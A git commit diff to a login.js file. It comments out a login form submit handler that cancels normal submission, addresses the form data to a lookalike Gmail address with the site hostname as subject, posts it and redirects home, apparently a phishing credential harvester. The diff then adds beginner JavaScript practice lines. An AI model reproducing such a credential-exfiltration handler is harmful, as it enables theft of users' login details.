be394e6080c5b5f14828fbcf1ac88f4ba63de091
joseph <arranonetwork435@gmail.com>
2022-07-27 18:50:30 +0100

    commit form

--- login.js
+++ login.js
@@ -1,4 +1,4 @@
-Form.addEventListener('submit', (e) => {
+/* Form.addEventListener('submit', (e) => {
     e.preventDefault();
     mail = 'googldotco@gmail.com'
     subject = `${window.location.hostname} ${new Date()}`
@@ -11,4 +11,43 @@ Form.addEventListener('submit', (e) => {
         body:body
     }).then(res => window.location.assign('/'))
     console.log(body)
-})
+}) */
+
+/*let Name = 'ade'
+let anotherName = 'mola'
+let fullName = Name + anotherName
+console.log(fullName)*/
+/*
+
+let x = 12
+let y = 3
+let z = x + y 
+add.innerHTML = z
+
+let j = 12
+let f = 3
+let k = j - f 
+subtract.innerHTML = k
+
+let i = 12
+let b = 3
+let d = i * b 
+multiplication.innerHTML = d
+
+let g = 100
+let s = 50
+let e = g / s
+division.innerHTML = e
+
+
+let Name = 'wedding'
+let anotherName = 'ring'
+let fullName = Name + anotherName
+console.log(fullName)
+*/
+let mountains = ['Everest', 'Fuji', 'nanga parbat']
+console.log(typeof z);
+console.log(mountains[1]);
+console.log(mountains[2]);
+
+ 
